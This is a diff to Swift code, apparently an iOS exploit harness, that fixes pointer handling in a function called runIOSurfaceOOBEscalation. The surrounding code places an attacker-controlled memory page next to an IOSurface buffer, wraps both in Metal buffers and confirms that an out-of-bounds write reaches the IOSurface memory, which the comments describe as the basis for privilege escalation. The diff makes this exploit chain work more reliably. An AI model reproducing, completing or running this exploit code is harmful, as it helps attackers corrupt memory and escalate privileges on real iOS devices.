@@ -2478,11 +2478,12 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
         // Lock to stabilise the backing address
         var seed: UInt32 = 0
         IOSurfaceLock(surf, .readOnly, &seed)
-        guard let surfBaseRaw = IOSurfaceGetBaseAddress(surf) else {
-            step("✗ IOSurfaceGetBaseAddress nil"); IOSurfaceUnlock(surf, .readOnly, &seed); completion(); return
-        }
+        let surfBaseRaw = IOSurfaceGetBaseAddress(surf)   // non-optional on iOS
         let allocSz = IOSurfaceGetAllocSize(surf)
         IOSurfaceUnlock(surf, .readOnly, &seed)
+        guard UInt(bitPattern: surfBaseRaw) != 0 else {
+            step("✗ IOSurfaceGetBaseAddress returned NULL"); completion(); return
+        }
 
         let surfVA  = UInt(bitPattern: surfBaseRaw)
         let PAGE_SZ = 4096
@@ -2512,24 +2513,25 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
         // Verify adjacency: mmapVA + PAGE_SZ must equal surfVA
         guard mmapVA + UInt(PAGE_SZ) == surfVA else {
             step("✗ adjacency check failed (0x\(String(mmapVA+UInt(PAGE_SZ),radix:16)) != 0x\(String(surfVA,radix:16)))")
-            munmap(mmapResult, PAGE_SZ); completion(); return
+            munmap(UnsafeMutableRawPointer(bitPattern: mmapVA), PAGE_SZ); completion(); return
         }
         step("✓ adjacency confirmed: mmap end = IOSurface base")
 
         // ── Step 3: Metal buffer views of both regions ───────────────────────────
         // b0 = attacker-controlled page (OOB source)
         // b1 = IOSurface backing (OOB target — kernel-read on lock/unlock)
-        guard let b0 = device.makeBuffer(bytesNoCopy: mmapResult!,
+        let mmapPtr = UnsafeMutableRawPointer(bitPattern: mmapVA)!   // safe: guard above confirmed mmapVA == targetVA != 0
+        guard let b0 = device.makeBuffer(bytesNoCopy: mmapPtr,
                                           length: PAGE_SZ,
                                           options: .storageModeShared,
                                           deallocator: nil) else {
-            step("✗ b0 makeBuffer(bytesNoCopy) failed"); munmap(mmapResult, PAGE_SZ); completion(); return
+            step("✗ b0 makeBuffer(bytesNoCopy) failed"); munmap(mmapPtr, PAGE_SZ); completion(); return
         }
         guard let b1 = device.makeBuffer(bytesNoCopy: surfBaseRaw,
                                           length: allocSz,
                                           options: .storageModeShared,
                                           deallocator: nil) else {
-            step("✗ b1 makeBuffer(bytesNoCopy) failed"); munmap(mmapResult, PAGE_SZ); completion(); return
+            step("✗ b1 makeBuffer(bytesNoCopy) failed"); munmap(mmapPtr, PAGE_SZ); completion(); return
         }
         step("b0 Metal buf=0x\(String(UInt(bitPattern:b0.contents()),radix:16)) length=\(PAGE_SZ)")
         step("b1 Metal buf=0x\(String(UInt(bitPattern:b1.contents()),radix:16)) length=\(allocSz)")
@@ -2541,7 +2543,7 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
         let surfPtr = surfBaseRaw.assumingMemoryBound(to: UInt8.self)
         guard surfPtr[0] == 0xAA else {
             step("✗ sentinel miss — OOB write did not land in IOSurface backing")
-            munmap(mmapResult, PAGE_SZ); completion(); return
+            munmap(mmapPtr, PAGE_SZ); completion(); return
         }
         p0[PAGE_SZ] = 0x00   // restore
         step("✓ sentinel confirmed — OOB write reaches IOSurface pixel buffer")
@@ -2623,7 +2625,7 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
             step("  lock failed kr=\(lockKR) — sandbox or lock contention")
         }
 
-        munmap(mmapResult, PAGE_SZ)
+        munmap(mmapPtr, PAGE_SZ)
         step("── IOSurface OOB Escalation complete ──────────")
         completion()
     }
